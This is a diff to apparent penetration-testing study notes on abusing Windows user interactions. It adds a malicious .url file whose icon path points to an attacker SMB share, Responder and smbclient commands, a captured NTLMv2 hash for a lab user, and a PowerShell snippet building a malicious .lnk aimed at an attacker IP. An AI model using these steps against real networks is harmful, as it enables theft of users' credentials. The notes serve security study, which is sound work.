@@ -1,5 +1,5 @@
 ---
-title: Windows User interactions
+title: Abusing Windows User interactions
 author: amandaguglieri
 draft: false
 TableOfContents: true
@@ -8,7 +8,7 @@ tags:
   - escalation
   - windows
 ---
-
+# Abusing Windows User interactions
 
 Users are sometimes the weakest link in an organization.
 
@@ -119,7 +119,10 @@ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 ```
 
 
-## Capturing Hashes with a Malicious .lnk File
+## # URL File Attack: Capturing Hashes with a Malicious .url File
+
+A URL file attack is a type of network-based exploit that manipulates certain file formats to deceive systems into revealing sensitive information, such as NTLM hashes. This attack exploits the behaviour of URL files (.url), shell command files (.scf), and other file types to initiate connections to an adversary-controlled listener.
+
 
 Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
 
@@ -137,3 +140,58 @@ $lnk.Description = "Browsing to the directory where this file is saved will trig
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
+
+
+
+So we create the following file audir.url. The goal for this file is creating a connection to our attacker smb share with the hope to capture an NTLM hash. The audit.url:
+
+```text
+[InternetShortcut]
+URL=Nomatterwhat
+WorkingDirectory=Lalala
+IconFile=\\192.168.45.201\%USERNAME%\icon.ico
+IconIndex=1 
+```
+
+We launch responder from our kali attacker machine:
+
+```bash
+sudo responder -I tun0 -wv
+```
+
+We connect to the share and upload the audit.url file. We list with dir:
+
+```bash
+smbclient \\\\192.168.150.172\\DocumentsShare -N 
+put audit.url
+dir
+```
+
+After a while we obtain a NTLMv2--SSP hash:
+
+```text
+[SMB] NTLMv2-SSP Client   : 192.168.150.172
+[SMB] NTLMv2-SSP Username : VAULT\anirudh
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:aba6a4fa4c80e6f8:92268B414BF4F1A235F3E7DCFCB3A748:010100000000000000E68DEAD26DDC01337C38913953BE2500000000020008004D00590052004B0001001E00570049004E002D0048003400510033005500380058003200310034004B0004003400570049004E002D0048003400510033005500380058003200310034004B002E004D00590052004B002E004C004F00430041004C00030014004D00590052004B002E004C004F00430041004C00050014004D00590052004B002E004C004F00430041004C000700080000E68DEAD26DDC01060004000200000008003000300000000000000001000000002000000BE3F69B91F1AF51F2BEE6D66F69928BEEBDFF8255EB1ECC647CF9477CF6CEAD0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300031000000000000000000  
+```
+
+## .lnk File Attack: Capturing Hashes with a Malicious .lnk File
+
+Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
+
+We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.
+
+We can also make one using a few lines of PowerShell, malicious.lnk:
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+
